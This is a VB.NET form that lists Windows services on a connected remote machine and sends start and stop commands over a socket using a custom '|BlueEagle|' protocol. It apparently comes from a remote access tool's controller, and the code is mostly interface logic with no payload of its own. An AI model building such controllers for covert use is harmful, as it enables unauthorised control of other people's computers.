Public Class ServiceController

    Dim rr As New TextBox

    Private controllers As New System.Collections.Generic.SortedList(Of String, ServiceController)

    Public sock As Integer
    Dim state As Integer
    Dim time As Integer

    Private Sub ServiceController_Load(sender As Object, e As System.EventArgs) Handles Me.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        LoaderX.Start()

    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ListView1.Items.Clear()



    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        Dim xt$

        xt = ListView1.Items.Item(ListView1.FocusedItem.Index).SubItems.Item(0).Text()
        If xt = "Stopped" Then
            RunServiceToolStripMenuItem.Enabled = True ' run
            StopServiceToolStripMenuItem.Enabled = False ' stop 
        End If
        If xt = "Running" Then
            RunServiceToolStripMenuItem.Enabled = False ' run
            StopServiceToolStripMenuItem.Enabled = True  ' stop 
        End If

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick

        On Error Resume Next
        For Each Process As ListViewItem In ListView1.Items


            If Process.Text.Contains("Stopped") Then

                'Process.BackColor = Color.LightSteelBlue
                Process.ImageIndex = 0
            ElseIf Process.Text.Contains("Running") Then
                'Process.BackColor = Color.LightSteelBlue
                Process.ImageIndex = 1
            End If

        Next


        'Process.BackColor = Color.LightSteelBlue



    End Sub

    Private Sub StopServiceToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles StopServiceToolStripMenuItem.Click
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(x.ToolTipText, "Voz" & "|BlueEagle|" & "0") ' stop
        Next
    End Sub

    Private Sub RunServiceToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RunServiceToolStripMenuItem.Click
        For Each x As ListViewItem In Main.L1.SelectedItems
            Main.S.Send(x.ToolTipText, "Voz" & "|BlueEagle|" & "1") ' run
        Next
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        rr.Text += 1

        If rr.Text = 25 Then
            Me.Opacity = 9.9R

            Timer3.Enabled = False
        End If
    End Sub

    Private Sub RefreshServicesToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshServicesToolStripMenuItem.Click
        ListView1.Items.Clear()

        Me.Opacity = 0.8R
        rr.Text = 1
        Timer3.Enabled = True
        Main.S.Send(sock, "GOs")
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Dim C As String
        C = ListView1.Items.Count.ToString
        Label2.Text = C
    End Sub
    Dim Curr As Double = 0.0
    Private Sub LoaderX_Tick(sender As System.Object, e As System.EventArgs) Handles LoaderX.Tick
        If Curr < 453 Then '454
            Curr += 45.4
            Me.Size = New Size(Me.Width, Curr)
        Else
            LoaderX.Stop()
            rr.Text = 1
            Timer3.Enabled = True
            Main.S.Send(sock, "GOs")



            If state = 1 Then

                Timer1.Interval = time
                Timer1.Start()
            Else

                Timer1.Stop()
            End If
            Reforge()
            Exit Sub
        End If
    End Sub
    Sub Reforge() '300--> 150 --> 80 --> 40 --> 190
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2 - 227)

        Me.Refresh()
    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub



#End Region
End Class